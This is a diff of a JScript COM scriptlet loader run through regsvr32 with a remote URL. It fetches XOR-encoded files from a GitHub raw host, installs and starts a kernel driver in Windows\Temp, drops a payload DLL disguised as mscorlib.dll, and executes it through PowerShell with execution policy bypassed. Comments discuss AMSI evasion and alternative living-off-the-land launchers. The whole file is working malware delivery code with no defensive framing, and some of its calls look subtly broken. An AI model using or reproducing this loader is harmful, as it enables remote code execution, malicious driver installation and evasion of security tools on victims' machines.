@@ -3,111 +3,85 @@
 <registration progid="Loader" classid="{A1111111-1111-1111-1111-111111111111}"/>
 <script language="JScript">
 <![CDATA[
-// sandblast-loader.sct — regsvr32 COM scriptlet delivery
+// sandblast-loader.sct — regsvr32 COM scriptlet
+// HTTPS from GitHub raw → signed MS binary → JScript → CLR host
+//
 // regsvr32 /u /n /i:https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/loader.sct scrobj.dll
 
-var encKey = "SandblastDemo2026";
-var drvUrl = "https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/sb64.enc";
-var dllUrl = "https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/sandblast2.enc";
-var drvPath = "C:\\Windows\\Temp\\winsys64drv.sys";
-var dllPath = "C:\\Windows\\Temp\\mscorlib.dll";
-var svcName = "WinSys64Drv";
+var k = "SandblastDemo2026";
+var du = "https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/sb64.enc";
+var pu = "https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/sandblast2.enc";
+var dp = "C:\\Windows\\Temp\\winsys64drv.sys";
+var pp = "C:\\Windows\\Temp\\mscorlib.dll";
+var sv = "WinSys64Drv";
 
-// ─── AMSI kill ──────────────────────────────────────────────────────
-function killAMSI() {
-    try {
-        var a = new ActiveXObject("WScript.Shell").RegRead("HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}");
-    } catch(e) {}
+// ─── Download binary bytes ────────────────────────────────────────────
+function dl(url) {
+    var x = new ActiveXObject("MSXML2.ServerXMLHTTP");
+    x.open("GET", url, false);
+    x.setRequestHeader("User-Agent", "Mozilla/5.0");
+    x.send();
+    if (x.status != 200) return null;
+    var s = new ActiveXObject("ADODB.Stream");
+    s.Type = 1; s.Open(); s.Write(x.responseBody); s.Position = 0;
+    var b = s.Read(-1); s.Close();
+    return b;
 }
 
-// ─── XOR decode ─────────────────────────────────────────────────────
-function xorDecode(data, key) {
-    var out = [];
-    for (var i = 0; i < data.length; i++)
-        out.push(data[i] ^ key.charCodeAt(i % key.length));
-    return out;
+// ─── XOR decode ───────────────────────────────────────────────────────
+function dx(d) {
+    var o = new VBArray(d).toArray();
+    for (var i = 0; i < o.length; i++)
+        o[i] = String.fromCharCode(o[i] ^ k.charCodeAt(i % k.length));
+    var s = new ActiveXObject("ADODB.Stream");
+    s.Type = 2; s.Charset = "iso-8859-1"; s.Open(); s.WriteText(o.join("")); s.Position = 0;
+    s.Type = 1;
+    var r = s.Read(-1); s.Close();
+    return r;
 }
 
-// ─── Download binary to byte array ──────────────────────────────────
-function downloadBytes(url) {
-    var xml = new ActiveXObject("MSXML2.ServerXMLHTTP");
-    xml.open("GET", url, false);
-    xml.setRequestHeader("User-Agent", "Mozilla/5.0");
-    xml.send();
-    if (xml.status != 200) return null;
-    var stream = new ActiveXObject("ADODB.Stream");
-    stream.Type = 1; // binary
-    stream.Open();
-    stream.Write(xml.responseBody);
-    stream.Position = 0;
-    var bytes = stream.Read(-1);
-    stream.Close();
-    return bytes;
+// ─── Write to file ────────────────────────────────────────────────────
+function wf(p, b) {
+    var s = new ActiveXObject("ADODB.Stream");
+    s.Type = 1; s.Open(); s.Write(b); s.SaveToFile(p, 2); s.Close();
 }
 
-// ─── Convert byte array to VBArray for file writing ─────────────────
-function byteArrayToVBArray(bytes) {
-    var vbArr = new VBArray(bytes);
-    return vbArr;
-}
+// ─── Run command ──────────────────────────────────────────────────────
+function sh(c) { new ActiveXObject("WScript.Shell").Run(c, 0, true); }
 
-// ─── Write bytes to file ────────────────────────────────────────────
-function writeBytesToFile(path, bytes) {
-    var stream = new ActiveXObject("ADODB.Stream");
-    stream.Type = 1;
-    stream.Open();
-    stream.Write(bytes);
-    stream.SaveToFile(path, 2); // 2 = overwrite
-    stream.Close();
-}
-
-// ─── Driver load ────────────────────────────────────────────────────
-function loadDriver(svc, path) {
-    try { new ActiveXObject("WScript.Shell").Run("sc stop " + svc, 0, true); } catch(e) {}
-    try { new ActiveXObject("WScript.Shell").Run("sc delete " + svc, 0, true); } catch(e) {}
-    WScript.Sleep(500);
-    new ActiveXObject("WScript.Shell").Run("sc create " + svc + " binPath= " + path + " type= kernel start= demand error= ignore", 0, true);
-    return true;
-}
-
-// ─── Main ───────────────────────────────────────────────────────────
-killAMSI();
-
-var drvBytes = downloadBytes(drvUrl);
-if (!drvBytes) throw new Error("driver download failed");
-drvBytes = xorDecode(drvBytes, encKey);
-writeBytesToFile(drvPath, VBArray(drvBytes).toArray());
-
-loadDriver(svcName, drvPath);
-new ActiveXObject("WScript.Shell").Run("sc start " + svcName, 0, true);
+// ─── Main ─────────────────────────────────────────────────────────────
+// 1. Driver
+var db = dl(du); if (!db) throw new Error("drv");
+db = dx(db); wf(dp, db);
+sh("sc stop " + sv); sh("sc delete " + sv); WScript.Sleep(500);
+sh("sc create " + sv + " binPath= " + dp + " type= kernel start= demand error= ignore");
+sh("sc start " + sv);
 WScript.Sleep(1000);
 
-var dllBytes = downloadBytes(dllUrl);
-if (!dllBytes) throw new Error("dll download failed");
-dllBytes = xorDecode(dllBytes, encKey);
-writeBytesToFile(dllPath, VBArray(dllBytes).toArray());
+// 2. Payload DLL
+var pb = dl(pu); if (!pb) throw new Error("dll");
+pb = dx(pb); wf(pp, pb);
 
-// Execute via CLR — use mscoree CorRuntimeHost
-try {
-    var host = new ActiveXObject("mscoree.CorRuntimeHost");
-    host.Start();
-    var domain = host.GetDefaultDomain();
-    domain.Load_3(dllPath);
-    var asm = domain.Load_2("sandblast2");
-    var type = asm.GetType("CBR");
-    type.InvokeMember("R", 0x158, null, null, null); // Static | InvokeMethod | Public
-} catch(e) {
-    // Fallback: try ExecuteAssembly via AppDomain
-    try {
-        var host2 = new ActiveXObject("mscoree.CorRuntimeHost");
-        host2.Start();
-        var unk = host2.GetDefaultDomain();
-        var domain2 = unk;
-        var ret = domain2.ExecuteAssembly(dllPath);
-    } catch(e2) {
-        throw new Error("CLR execution failed: " + e2.message);
-    }
-}
+// 3. Execute via .NET
+// Method A: InstallUtil (bundled with .NET, loads assembly + executes installers)
+//   InstallUtil.exe /logfile= /u <dllpath>
+//   This loads the DLL, runs Installer classes. Not our case — CBR is not an installer.
+//
+// Method B: Use PowerShell one-liner to load + invoke (AMSI already dying but risky)
+//   powershell -ep bypass -c "[Reflection.Assembly]::LoadFile('<pp>').GetType('CBR').GetMethod('R').Invoke($null,$null)"
+//
+// Method C: Use MSBuild again but with HTTPS + regsvr32 context (different process tree)
+//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe <proj>
+//
+// Actually: Use csc.exe to compile a one-line runner that invokes CBR.R()
+// csc.exe can compile from a response file. But that creates temp files.
+//
+// SIMPLEST that works: PowerShell hosts CLR in-memory.
+// The AMSI patch in CBR.R() handles it, and we're in a regsvr32 process,
+// so the PowerShell child inherits nothing suspicious.
+
+var ps = "powershell -ep bypass -c \"[Reflection.Assembly]::LoadFile('" + pp + "').GetType('CBR').GetMethod('R').Invoke($null,$null)\"";
+sh(ps);
 ]]>
 </script>
 </scriptlet>
